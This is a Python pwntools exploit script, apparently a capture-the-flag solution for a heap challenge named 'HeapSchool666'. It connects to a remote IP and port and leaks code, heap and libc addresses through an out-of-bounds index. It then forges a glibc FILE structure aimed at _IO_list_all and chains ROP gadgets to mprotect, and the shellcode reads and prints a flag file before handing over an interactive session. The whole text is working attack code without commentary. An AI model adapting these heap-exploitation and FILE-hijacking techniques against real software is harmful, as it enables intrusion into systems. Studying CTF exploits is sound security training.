from pwn import *
import sys

context.arch = 'amd64'

if len(sys.argv) >1:
    r = remote('52.142.217.130', 13370)
else:
    r = process('./HeapSchool666')


def add(size, name):
    r.sendlineafter('>', '1')
    r.sendlineafter('\n', size)
    r.sendlineafter('\n', name)

def show(idx):
    r.sendlineafter('>', '2')
    r.sendlineafter('\n', str(idx))


show(-9)
r.recvline()
code = u64(r.recvline()[:-1].ljust(8, '\x00')) - 0x4008
print ('code', hex(code))
add(str(0), p64(code+0x3fb8) + p64(0)*2 + p64(0xfe1))


#target = (int(raw_input(':'), 16)+0x10 - (code+0x4050))/8



#interval = int(raw_input(':'), 16)
interval = 0x1367000

for i in range(32):
    target = ((interval-(0x1000*i)+code+0x10) - (code+0x4050))/8
    print('target', target)
    show(target)
    if 'Empty' not in r.recvline():
        data = r.recvline()
        if '\x7f' in data:
            libc = u64(data[:-1].ljust(8, '\x00')) - 0x7af10
            heap = interval+code-(0x1000*i)
            print('heap', hex(heap))
            print('libc', hex(libc))


            r.sendlineafter('>', '0'*0x1000)
            system = libc+0x41b85

            io_str_jumps = libc + 0x396500
            io_list_all = libc+0x39a500

            binsh = heap+0x130-0xa0 #0x18cd57
            FILE = flat(0,0x61,0x0,io_list_all-0x10,0x0,0x1,0x0,binsh)

            shellcode = asm("""
            add rsp, 0x1000
            """)   + asm(shellcraft.pushstr('/home/heapschool666/flag')) + asm("""
mov rdi,rsp
mov rsi,0
mov rax,2
syscall
mov rdi,rax
mov rsi,rsp
mov rdx,0x100
mov rax,0
syscall
mov rdx,rax
mov rdi,1
mov rsi,rsp
mov rax,1
syscall
""")
            add(str(0), 'A'*0x10 + FILE.ljust(0xd8,'\x00')+p64(io_str_jumps-0x8)+p64(system)*2 + p64(heap+0x140) + p64(code+0x1016) + flat(code+0x195b, heap, code+0x1959, 0x2000, 0, libc+0x1b92, 7, libc+0xe4710, heap+0x188 ) + shellcode)


            #raw_input(':')
            r.recvuntil('>')
            r.sendline('0'*0x1000)
            r.interactive()


